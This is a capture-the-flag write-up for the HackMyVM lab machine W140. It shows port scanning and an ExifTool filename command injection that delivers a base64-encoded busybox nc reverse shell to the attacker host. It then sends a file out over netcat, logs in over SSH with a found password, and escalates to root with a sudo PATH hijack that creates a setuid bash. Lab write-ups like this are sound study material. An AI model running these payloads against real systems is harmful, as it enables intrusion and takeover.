# W140

## Recon

::: details nmap_scan.log.md
```log
Open ports, closed hearts.

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.0.2.15:22
Open 10.0.2.15:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.15
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 ff:fd:b2:0f:38:88:1a:44:c4:2b:64:2c:d2:97:f6:8d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDJKWNkfy8PbdrAcMdxy7kWBq5iWHXTzkG3xRUBL5P88XuLi8SZLoMTwIcS5APTEU5hHz6ae2dNtq/NRBD2NkLREINsgJNEgEEosMQLrJMCgUqVLZQGObJOG3USAQ42QmW3rMp34L2bSPqmq1IRGPbI1FoV6ToRveEXooUTiMrl07nVsI3xwdm7O6V653JmlE1qKYH/tL1bQ5TQ43dX2INZRjuzB20SdOm5p1x2QnFcKjngbhmGDyYBN9FMSGsrPMdvjd6WHAeU0hzJgg7Uw55nkWzmWPfjwzkGTg1O74edFAgEj1AvBvl4Of3pcAf0EpxP5TOuawIsmKBmC+oQIgh2MgFXrKr7oMAxvSasvkAkMaXXe7tEMdDxgIr5w1TWgaxSUHM1vS58Z3+Ebxcss8NgbeeCA4iCUutg9iPPudFgzJSw7g0L0xS8w942f6DdQFOo65FEOwj9j54ESfMU8d6IyMtd1METepK3KFpyyBiiHYnjGOy9ns1E7f/fo7+KtIM=
|   256 ca:50:54:f7:24:4e:a7:f1:06:46:e7:22:30:ec:95:b7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLCt2rpz+6Yt+kOCXbY2sLJEwc66kfCz200w1PiexHM7HN8IdliV0pg/iktzu3lsOBeFwmYbsD1NHHZz7j6Ftgg=
|   256 09:68:c0:62:83:1e:f1:5d:cb:29:a6:5e:b4:72:aa:cf (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAI0q5tzWMhFnkW/6Zz8ER108rSSLtVfq8YX5AnJ3vQG
80/tcp open  http    syn-ack Apache httpd 2.4.54 ((Debian))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: w140
|_http-server-header: Apache/2.4.54 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/w140/writeup.png)

I tried uploading file `usb.jpg` and it got uploaded as analyzed image. 
```bash
└─$ curl http://10.0.2.15/analysed_images/usbjpg.txt
ExifTool Version Number         : 12.37
File Name                       : usb.jpg
Directory                       : .
File Size                       : 141 KiB
File Modification Date/Time     : 2026:01:13 04:44:50-05:00
File Access Date/Time           : 2026:01:13 04:44:50-05:00
File Inode Change Date/Time     : 2026:01:13 04:44:50-05:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 320
Y Resolution                    : 320
Image Width                     : 2940
Image Height                    : 1960
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 2940x1960
Megapixels                      : 5.8
```

### RCE

- [ExifTool Command Injection (CVE-2021-22204)](https://ine.com/blog/exiftool-command-injection-cve-2021-22204)
- [CVE-2022-23935-PoC-Exploit](https://github.com/dpbe32/CVE-2022-23935-PoC-Exploit) <-- Used this

In most CTFs `curl` doesn't exist and I get stuck, do `wget` or `ping` for sanity check of blind RCE.

![writeup-1.png](/assets/pentest/hackmyvm/w140/writeup-1.png)

```bash
└─$ curl 'http://10.0.2.15/upload.php' -F 'upload=Upload' -F "image=@usb.jpg;filename=\"echo $(base64 <<<'busybox nc 10.0.2.149 4444 -e /bin/bash')|base64 -d|sh|\";type=image/jpeg" -s
---
└─$ penelope -p 4444
www-data@w140:/var/www/uploads/1768298767$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement

Oh...
```bash
echo '<p>Please save this report as it will only be available for the next five minutes</p>';
$folder = "/var/www/uploads/$folder";
$cmd = "cd $folder && /opt/exiftool/exiftool * > /var/www/html/analysed_images/$sanitised.txt";
shell_exec($cmd);
```

```bash
www-data@w140:/var/www$ find . -type f | grep -vE 'images|js|css|assets'
./.w140.png
./html/upload.php
./html/index.html
./html/service.html
```

```bash
└─$ nc -lvnp 4445 > w140.png
---
www-data@w140:/var/www$ busybox nc 10.0.2.149 4445 < .w140.png
```

![writeup-2.png](/assets/pentest/hackmyvm/w140/writeup-2.png)

## SSH

```bash
└─$ sshpass -p 'BaoeCblP5KGJDmA' ssh ghost@10.0.2.15
ghost@w140:~$ id
uid=1000(ghost) gid=1000(ghost) groups=1000(ghost),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

### User.txt

```bash
ghost@w140:~$ cat user.txt
61f1157a5b8f5a4b6729367098fcb2a4
```

## Privilege Escalation

```bash
ghost@w140:~$ sudo -l
Matching Defaults entries for ghost on w140:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ghost may run the following commands on w140:
    (root) SETENV: NOPASSWD: /opt/Benz-w140
```

`sudo` allows setting environment variables, we can hijack PATH and get command execution
```bash
#!/bin/bash
. /opt/.bashre
cd /home/ghost/w140

# clean up log files
if [ -s log/w140.log ] && ! [ -L log/w140.log ]; then
    /bin/cat log/w140.log > log/w140.log.old
    /usr/bin/truncate -s@ log/w140.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {}
```

```bash
ghost@w140:~$ mkdir w140/log -p
ghost@w140:~$ touch w140/log/w140.log

ghost@w140:~$ echo $'#!/bin/bash\ninstall -m4777 /bin/bash /tmp/rootbash' > find
ghost@w140:~$ chmod +x find
ghost@w140:~$ sudo PATH="$(pwd):$PATH" /opt/Benz-w140

ghost@w140:~$ /tmp/rootbash -p
rootbash-5.1# id
uid=1000(ghost) gid=1000(ghost) euid=0(root) groups=1000(ghost),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

You can also abuse LD_PRELOAD and many things I guess
- [Linux Privilege Escalation > LD_PRELOAD & LD_LIBRARY_PATH](https://blog.1nf1n1ty.team/hacktricks/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path)

### Root.txt

```
rootbash-5.1# cat /root/root.txt
2f9f7d1b4a6ae9d6bbbaf6298c5dcc25
```